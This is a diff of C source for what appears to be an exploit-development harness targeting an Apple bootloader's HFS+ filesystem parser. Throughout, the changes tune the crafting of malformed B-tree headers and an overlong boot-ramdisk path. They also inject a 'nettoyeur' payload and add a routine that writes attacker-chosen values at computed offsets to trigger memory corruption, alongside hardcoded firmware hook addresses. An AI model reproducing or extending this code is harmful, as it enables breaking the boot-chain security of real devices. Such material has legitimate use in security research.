@@ -12,9 +12,13 @@
 
 #define breakpoint1_ADDR        (0x178C4 + 1) /* ResolvePathToCatalogEntry */ //yes
 
-#define fuck1_ADDR              (0x18726 + 1) //yes1
-#define fuck2_ADDR              (0x1873C + 1) //yes1
-#define fuck3_ADDR              (0x18852 + 1) //yes1
+
+#define fuck1_ADDR              (0x18726 + 1) //yes
+/* where the bins addr gets loaded */
+#define fuck2_ADDR              (0x1873C + 1) //yes
+/* after we skipped the zeros */
+#define fuck3_ADDR              (0x18852 + 1) //yes
+/* return block */
 
 #define wait_for_event_ADDR     (0x00814) //yes
 #define hugechunk_ADDR          (0x00CAE + 1) //yes
@@ -46,6 +50,8 @@
 #define bcopy_ADDR              (0x31E64) //yes
 #define decompress_lzss_ADDR    (0x23260 + 1) //yes
 
+#define memalign_ADDR           (0x186e4 + 1) //yes
+
 void NAKED
 my_breakpoint1(void)
 {
@@ -75,7 +81,8 @@ real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
         dumpfile("DUMP_z1");
     }else{
 #if 0
-        fprintf(stderr, "_memalign: sp = 0x%x\n", sp);
+        register unsigned int r9 __asm("r9");
+        fprintf(stderr, "sp = 0x%x, r3 = 0x%x, r9 = 0x%x\n", sp, r3, r9);
 #endif
     }
     (void)(r0 && r1 && r2);
@@ -207,7 +214,7 @@ void
 my_adjust_environ(void)
 {
 #if 1
-    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/disk.dmg", 0);
+    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/0/1/2/3/4/5/6/7/8/9disk.dmg", 0);
 #endif
 }
 
@@ -271,7 +278,7 @@ suck_sid(void)
 
 //
 int
-drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth)
+drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth, unsigned int value)
 {
     uint16_t i = 0;
     while (1) {
@@ -283,8 +290,8 @@ drillDownPathTill(void *buffer, unsigned int seq, unsigned int depth)
         uint16_t offset = record_base + 2 + key_len;
         if (seq == 3 * (depth + 1) + 1 && i == floor((depth + 1) / 2.0)) {
             //iPhone 4 rev.A (3,2) needs +4 as offset (why?)
-            eprintf("TRIGGERING: writed 0x100 (BE) at offset 0x%x\n", offset + 4);
-            PUT_DWORD_BE(buffer, offset + 4, 0x10000);
+            eprintf("TRIGGERING: writed 0x%x (BE) at offset 0x%x\n", value, offset + 4);
+            PUT_DWORD_BE(buffer, offset + 4, value);
             return 1;
         }
         i++;
@@ -298,7 +305,7 @@ my_readp(void *ih, void *buffer, long long offset, int length)
 {
 #define TREEDEPTH 1 //+4? for recursion
 #define TRYFIRST 0
-#define TRYLAST 0
+#define TRYLAST 0 //not working
     long long off;
     eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
 #if TRYLAST
@@ -310,7 +317,11 @@ my_readp(void *ih, void *buffer, long long offset, int length)
     assert(off == offset);
     length = read(rfd, buffer, length);
 #if TREEDEPTH || TRYFIRST || TRYLAST
-#define NODE_SIZE (0x400) //todo
+#if MATRIX
+#define NODE_SIZE (node_size)
+#else
+#define NODE_SIZE (0x4000) //todo
+#endif
 #define TOTAL_NODES (0xFFF)
 #define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
 #define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
@@ -348,12 +359,15 @@ my_readp(void *ih, void *buffer, long long offset, int length)
 #else
                 PUT_DWORD_BE(buffer, 16, 3);            /* BTHeaderRec::rootNode */
 #endif
+#if NETTO
                 memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
-                
+#endif
                 break;
             case 2:
+#if NETTO
                 memset(buffer, 'F', length);
                 if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
+#endif
                 PUT_WORD_BE(buffer, 32, NODE_SIZE);            /* BTHeaderRec::nodeSize */
                 PUT_DWORD_BE(buffer, 36, TOTAL_NODES);        /* BTHeaderRec::totalNodes */
                 PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
@@ -445,16 +459,21 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                         [pad]
                      }
                      */
-#if 1
-                    drillDownPathTill(buffer, seq, 12);
+#if TREEDEPTH
+#if MATRIX
+                    drillDownPathTill(buffer, seq, drill_path, 0x10000);
+#else
+                    drillDownPathTill(buffer, seq, 1, 0x10000);
+#endif
 #endif
                 }
             }
 #endif /* TREEDEPTH */
         }
 #if TRYLAST
-        if (seq == 2 + (5 * 2) * (2 + TREEDEPTH)) {
-            PUT_DWORD_BE(buffer, 0xd6, 1);
+        if (seq == 2 + (23 * 2) * (2 + TREEDEPTH)) { /* XXX wot? why 14? */
+            eprintf("TRIGGERING\n");
+            PUT_DWORD_BE(buffer, 0x11C, 1);
         }
 #endif /* TRYLAST */
         if (seq < 3) {
@@ -510,7 +529,9 @@ dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
     { 0xbf500000, 0x1DE8E, 0, 0, 2 }, //yes
     { 0xbf500000, 0x1DEAE, 0, 0, 2 }, //yes
     { 0xbf500000, 0x1DE7E, 0, 0, 2 }, //yes
+        
     { 0xbf106000, 0x1DD48, 0, 0, 2 }, //yes
+        
     { 0xbf500008, 0x1DF16, 0, 0, 2 }, //yes
     { 0xbf500008, 0x1DF1C, 2, 0, 2 }, //yes
     { 0xbf50000c, 0x1DF22, 3, 0, 4 }, //yes
